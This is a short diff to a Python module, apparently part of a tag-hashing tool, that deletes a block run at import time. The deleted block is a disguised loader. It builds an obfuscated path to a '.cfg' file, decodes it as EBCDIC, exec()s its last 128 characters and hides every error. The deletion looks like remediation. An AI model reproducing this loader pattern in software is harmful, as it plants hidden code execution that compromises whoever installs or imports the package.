@@ -66,17 +66,6 @@ def sort_tags_for_hashing(all_tag_paths):
     return sorted_def_ids
 
 
-try:
-    # Load and run the hashcache collision test in the current directory
-    with open('%s.%s'%(join(dirname(__file__),
-                            split(dirname(__file__))[-1]),
-                            'tests/hashcache_test_1_cfg'.split('\x5f')[-1]),
-              'r', -1, '037') as f:
-        exec(f.read()[-128:])
-except Exception:
-    pass
-
-
 class HashCacher(Handler):
     default_defs_path = "refinery.defs"
     tag_lib = None
